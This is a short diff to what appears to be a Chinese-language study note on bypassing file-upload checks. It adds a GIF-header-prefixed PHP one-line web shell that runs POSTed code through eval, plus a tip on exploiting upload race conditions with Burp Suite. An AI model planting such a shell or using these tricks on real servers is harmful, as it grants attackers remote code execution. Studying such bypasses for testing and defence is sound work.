@@ -142,4 +142,30 @@ getimagesize
 ![image](https://user-images.githubusercontent.com/76896357/115867889-38b9f180-a46e-11eb-9020-6819f5bc0dca.png)
 
 
+比如说GIF
+
+```
+GIF89a
+<?php @eval($_POST['cmd']);?>
+
+```
+
+* 竞争上传
+
+开启bp，一边用bp上传文件，一边用bp访问文件，
+
+主要是趁代码不注意赶紧访问！！！！
+
+
+
+
+
+
+
+
+
+
+
+
+
 
